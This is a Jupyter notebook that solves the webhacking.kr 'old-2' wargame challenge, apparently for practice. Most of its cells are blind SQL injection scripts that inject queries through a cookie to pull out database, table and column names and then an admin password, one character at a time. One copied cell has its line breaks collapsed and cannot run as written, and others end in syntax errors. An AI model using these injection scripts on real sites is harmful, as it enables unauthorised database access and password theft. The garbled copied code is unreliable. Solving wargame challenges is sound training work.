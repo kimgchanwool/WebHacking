{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ac9bdd82",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "requests.post('https://webhacking.kr/challenge/web-02/').text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c263f5cb",
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/env python \n",
    "import urllib2 \n",
    "import urllib \n",
    "url = \"https://webhacking.kr/challenge/web-02/\" \n",
    "cookie = \"PHPSESSID=j1gqc4lopk8ge3331ehiq9shhf; time=1571026965 \" \n",
    "ua = \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36\" \n",
    "truePhrase = \"2070-01-01 09:00:01\" def query(payload): \n",
    "    ccookie = cookie + urllib2.quote(payload) \n",
    "    req = urllib2.Request(url) req.add_header('cookie', ccookie) \n",
    "    req.add_header(\"User-Agent\", ua) res = urllib2.urlopen(req) \n",
    "    content = res.read() \n",
    "    # print ccookie \n",
    "    # print content \n",
    "    return truePhrase in content \n",
    "def find_db_name_len(db_index): \n",
    "    left = 0 \n",
    "    right = 200 # range (left, right] \n",
    "    while left + 1 < right: \n",
    "        mid = (left+right)//2 \n",
    "        print \"{}, {}, {}\".format(left, mid, right) \n",
    "        payload = \"and if((select length(table_schema) from information_schema.tables group by table_schema limit {},1) > {}, 1, 0)\".format(db_index, mid) \n",
    "        if query(payload): \n",
    "            left = mid \n",
    "            else: \n",
    "                right = mid \n",
    "                return right \n",
    "def find_db_name(db_index): \n",
    "    if db_index == 1: \n",
    "        return \"chall2\" # db_name_len = find_db_name_len(db_index) \n",
    "    db_name_len = 6 \n",
    "    db_name = \"\" \n",
    "    for pos in range(1, db_name_len+1): \n",
    "        left = 0 \n",
    "        right = 200 \n",
    "        while left + 1 < right:\n",
    "            mid = (left+right)//2 \n",
    "            print \"{}, {}, {}\".format(left, mid, right) \n",
    "            payload = \"and if((select ascii(substr(table_schema,{},1)) from information_schema.tables group by table_schema limit {},1)>{},1,0)\".format(pos, db_index, mid) \n",
    "            if query(payload): \n",
    "                left = mid \n",
    "            else: \n",
    "                right = mid \n",
    "                db_name += chr(right) \n",
    "                return db_name # print find_db_name(0) \n",
    "def find_table_name_length(db_name, table_index): \n",
    "    left = 0 right = 200 \n",
    "    while left + 1 < right: \n",
    "        mid = (left+right)//2 \n",
    "        payload = \"and if((select length(table_name) from information_schema.tables where table_schema='{}' group by table_name limit {},1)>{},1,0)\".format(db_name, table_index, mid) if query(payload): left = mid else: right = mid return right # print find_table_name_length('chall2', 0) # print find_table_name_length('chall2', 1) def find_table_name(db_name, table_index): table_name_len = find_table_name_length(db_name, table_index) table_name = \"\" for pos in range(1, table_name_len + 1): left = 0 right = 200 while left + 1 < right: mid = (left+right)//2 payload = \"and if((select ascii(substr(table_name,{},1)) from information_schema.tables where table_schema='{}' group by table_name limit {},1)>{},1,0)\".format(pos, db_name, table_index, mid) if query(payload): left = mid else: right = mid table_name += chr(right) return table_name # print find_table_name('chall2', 0) # print find_table_name('chall2', 1) def find_column_name(db_name, table_name): col_name = \"\" for pos in range(1, 3): left = 0 right = 200 while left + 1 < right: mid = (left+right)//2 payload = \"and if((select ascii(substr(column_name,{},1)) from information_schema.columns where table_schema='{}' and table_name='{}' group by column_name limit 0,1)>{},1,0)\".format(pos, db_name, table_name, mid) if query(payload): left = mid else: right = mid col_name += chr(right) return col_name def find_pw(): pw = \"\" for pos in range(1, 18): left = 0 right =200 while left + 1 < right: mid = (left+right)//2 payload = \"and if((select ascii(substr(pw,{},1)) from chall2.admin_area_pw limit 1, 1)>{},1,0)\".format(pos,mid) if query(payload): left = mid else: right = mid pw += chr(right) print chr(right) return pw # print find_column_name(\"chall2\", \"admin_area_pw\") print find_pw()\n",
    "\n",
    "출처: https://eine.tistory.com/entry/webhackingkr-old-2번 [아인스트라세의 SW 블로그]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "69e61c2e",
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/env python import urllib2 import urllib url = \"https://webhacking.kr/challenge/web-02/\" cookie = \"PHPSESSID=j1gqc4lopk8ge3331ehiq9shhf; time=1571026965 \" ua = \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36\" truePhrase = \"2070-01-01 09:00:01\" def query(payload): ccookie = cookie + urllib2.quote(payload) req = urllib2.Request(url) req.add_header('cookie', ccookie) req.add_header(\"User-Agent\", ua) res = urllib2.urlopen(req) content = res.read() # print ccookie # print content return truePhrase in content def find_db_name_len(db_index): left = 0 right = 200 # range (left, right] while left + 1 < right: mid = (left+right)//2 print \"{}, {}, {}\".format(left, mid, right) payload = \"and if((select length(table_schema) from information_schema.tables group by table_schema limit {},1) > {}, 1, 0)\".format(db_index, mid) if query(payload): left = mid else: right = mid return right def find_db_name(db_index): if db_index == 1: return \"chall2\" # db_name_len = find_db_name_len(db_index) db_name_len = 6 db_name = \"\" for pos in range(1, db_name_len+1): left = 0 right = 200 while left + 1 < right: mid = (left+right)//2 print \"{}, {}, {}\".format(left, mid, right) payload = \"and if((select ascii(substr(table_schema,{},1)) from information_schema.tables group by table_schema limit {},1)>{},1,0)\".format(pos, db_index, mid) if query(payload): left = mid else: right = mid db_name += chr(right) return db_name # print find_db_name(0) def find_table_name_length(db_name, table_index): left = 0 right = 200 while left + 1 < right: mid = (left+right)//2 payload = \"and if((select length(table_name) from information_schema.tables where table_schema='{}' group by table_name limit {},1)>{},1,0)\".format(db_name, table_index, mid) if query(payload): left = mid else: right = mid return right # print find_table_name_length('chall2', 0) # print find_table_name_length('chall2', 1) def find_table_name(db_name, table_index): table_name_len = find_table_name_length(db_name, table_index) table_name = \"\" for pos in range(1, table_name_len + 1): left = 0 right = 200 while left + 1 < right: mid = (left+right)//2 payload = \"and if((select ascii(substr(table_name,{},1)) from information_schema.tables where table_schema='{}' group by table_name limit {},1)>{},1,0)\".format(pos, db_name, table_index, mid) if query(payload): left = mid else: right = mid table_name += chr(right) return table_name # print find_table_name('chall2', 0) # print find_table_name('chall2', 1) def find_column_name(db_name, table_name): col_name = \"\" for pos in range(1, 3): left = 0 right = 200 while left + 1 < right: mid = (left+right)//2 payload = \"and if((select ascii(substr(column_name,{},1)) from information_schema.columns where table_schema='{}' and table_name='{}' group by column_name limit 0,1)>{},1,0)\".format(pos, db_name, table_name, mid) if query(payload): left = mid else: right = mid col_name += chr(right) return col_name def find_pw(): pw = \"\" for pos in range(1, 18): left = 0 right =200 while left + 1 < right: mid = (left+right)//2 payload = \"and if((select ascii(substr(pw,{},1)) from chall2.admin_area_pw limit 1, 1)>{},1,0)\".format(pos,mid) if query(payload): left = mid else: right = mid pw += chr(right) print chr(right) return pw # print find_column_name(\"chall2\", \"admin_area_pw\") print find_pw()\n",
    "\\\\"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "81746262",
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "invalid syntax (Temp/ipykernel_9104/2637508100.py, line 1)",
     "output_type": "error",
     "traceback": [
      "\u001b[1;36m  File \u001b[1;32m\"C:\\Users\\kingc\\AppData\\Local\\Temp/ipykernel_9104/2637508100.py\"\u001b[1;36m, line \u001b[1;32m1\u001b[0m\n\u001b[1;33m    (select count(table_name) from information_schema.tables where table_schema=database())\u001b[0m\n\u001b[1;37m            ^\u001b[0m\n\u001b[1;31mSyntaxError\u001b[0m\u001b[1;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "(select count(table_name) from information_schema.tables where table_schema=database())\n",
    "(select length(table_name) from information_schema.tables where table_schema=database() limit 0, 1) #첫번째 테이블의 길이\n",
    "(select length(table_name) from information_schema.tables where table_schema=database() limit 1, 2) #두번째 테이블의 길이"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "50ff372f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "admin_area_pw\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "i = 1; k=1\n",
    "url = 'https://webhacking.kr/challenge/web-02/'\n",
    "query =\"(select count(table_name) from information_schema.tables where table_schema=database())\"\n",
    "query1 = \"(select length(table_name) from information_schema.tables where table_schema=database() limit 0, 1)\"\n",
    "query2 = \"(select length(table_name) from information_schema.tables where table_schema=database() limit 1, 2)\"\n",
    "arr = []\n",
    "for i in range(1,14):\n",
    "    query3 = f\"(select ascii(substring(table_name, {i}, {i})) from information_schema.tables where table_schema=database() limit 0,1)\"\n",
    "    cookies = {\"Cookie\":\"\"\"PHPSESSID=u32hsib4im58tc8m8h01lef5j4; time={}\"\"\".format(query3)}\n",
    "    r = requests.get(url,cookies=cookies)\n",
    "    text = r.text\n",
    "    time = text.split('--')[1].replace(\"\\n\", \"\")\n",
    "    #print(time)\n",
    "    min = time.split(':')[-2]\n",
    "    sec = time.split(':')[-1]\n",
    "    answer = int(min) * 60 + int(sec)\n",
    "    arr.append(chr(answer))\n",
    "print(''.join(arr))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "id": "bc67ddc5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2070-01-01 09:01:59\n",
      "w\n"
     ]
    }
   ],
   "source": [
    "query4 = f\"SELECT ascii(substring(COLUMN_NAME, {100}, {100})) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_area_pw')\"\n",
    "#query3 = f\"(select ascii(substring(table_name, {i}, {i})) from information_schema.tables where table_schema=database() limit 0,1)\"\n",
    "cookies = {\"Cookie\":\"\"\"PHPSESSID=u32hsib4im58tc8m8h01lef5j4; time={}\"\"\".format(query4)}\n",
    "r = requests.get(url,cookies=cookies)\n",
    "text = r.text\n",
    "time = text.split('--')[1].replace(\"\\n\", \"\")\n",
    "print(time)\n",
    "#print(time)\n",
    "min = time.split(':')[-2]\n",
    "sec = time.split(':')[-1]\n",
    "answer = int(min) * 60 + int(sec)\n",
    "print(chr(answer))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "435e028b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "119\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'w'"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print(answer)\n",
    "chr(119)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "37d244c9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Database : chall2\n"
     ]
    }
   ],
   "source": [
    "\t\n",
    "import requests\n",
    "\t\n",
    " \n",
    "\t\n",
    "url =\"https://webhacking.kr/challenge/web-02/\"\n",
    "\t\n",
    "ck = \"\"\n",
    "\t\n",
    "db = \"\"\n",
    "\t\n",
    "table = \"\"\n",
    "\t\n",
    "columns = \"\"\n",
    "\t\n",
    "pw = \"\"\n",
    "\t\n",
    " \n",
    "\t\n",
    "for i in range(1,100):\n",
    "\t\n",
    "    if ck ==1:\n",
    "\t\n",
    "        break\n",
    "\t\n",
    "    for k in range(33,133):\n",
    "\t\n",
    "        cookies={\"Cookie\" : \"PHPSESSID=u32hsib4im58tc8m8h01lef5j4; time=0 || if(ord(substr((select database()),{},1))={},1,0)\".format(i,k)}\n",
    "\t\n",
    "        #ord(c) : 문자의 아스키 코드 값을 돌려주는 함수 / chr 함수와 반대\n",
    "\t\n",
    "        r =requests.get(url,cookies=cookies)\n",
    "\t\n",
    "        if r.text.find(\"09:00:01\") != -1:\n",
    "\t\n",
    "            db+=chr(k)\n",
    "\t\n",
    "            break\n",
    "\t\n",
    "        if k == 132:\n",
    "\t\n",
    "            ck =1\n",
    "print(\"Database : {}\".format(db))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "7cfb6c94",
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "invalid syntax (Temp/ipykernel_13772/2606604201.py, line 1)",
     "output_type": "error",
     "traceback": [
      "\u001b[1;36m  File \u001b[1;32m\"C:\\Users\\kingc\\AppData\\Local\\Temp/ipykernel_13772/2606604201.py\"\u001b[1;36m, line \u001b[1;32m1\u001b[0m\n\u001b[1;33m    ASCII(SUBSTR((SELECT pw FROM chall2.admin_area_pw LIMIT 0,1),1,1))=107\u001b[0m\n\u001b[1;37m                         ^\u001b[0m\n\u001b[1;31mSyntaxError\u001b[0m\u001b[1;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "1599053784 and (SELECT count(column_name) FROM information_schema.columns WHERE table_name='admin_area_pw')=1\n",
    "1599053784 and length((SELECT column_name FROM information_schema.columns WHERE table_name='admin_area_pw' LIMIT 0,1))=2\n",
    "1599053784 and ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='admin_area_pw' LIMIT 0,1),1,1))=112\n",
    "1599053784 and length((SELECT pw FROM chall2.admin_area_pw LIMIT 0, 1))=17\n",
    "ASCII(SUBSTR((SELECT pw FROM chall2.admin_area_pw LIMIT 0,1),1,1))=107"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "889d86e5",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
